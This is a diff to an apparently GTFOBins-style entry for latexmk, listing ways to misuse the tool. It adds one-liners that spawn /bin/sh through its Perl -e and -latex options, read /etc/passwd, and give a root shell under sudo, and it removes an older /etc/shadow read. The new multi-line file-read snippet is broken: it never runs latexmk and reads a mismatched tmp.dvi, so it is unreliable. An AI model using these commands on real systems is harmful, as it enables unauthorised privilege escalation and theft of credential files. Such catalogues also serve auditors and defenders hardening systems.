@@ -1,11 +1,14 @@
-description: `latexmk` is a perl script.
+description: This allows to execute [`perl`](/gtfobins/perl/) code.
 functions:
+  shell:
+    - code: latexmk -e 'exec "/bin/sh";'
+    - code: latexmk -latex='/bin/sh #' /dev/null
   file-read:
-    - code: |
-        echo "\documentclass[12pt]{article} \usepackage{verbatim} \begin{document} \verbatiminput{/etc/shadow} \end{document}" > read.tex
-        latexmk read.tex
-        strings read.dvi
+    - code: latexmk -e 'open(X,"/etc/passwd");while(<X>){print $_;}exit'
+    - description: The read file will be part of the output.
+      code: |
+        TF=$(mktemp)
+        echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' >$TF
+        strings tmp.dvi
   sudo:
-    - code: |
-        echo "PROGRAM > /tmp/result.txt" > /tmp/run.sh
-        sudo latexmk -latex="/tmp/run.sh" file.tex 
+    - code: sudo latexmk -e 'exec "/bin/sh";'
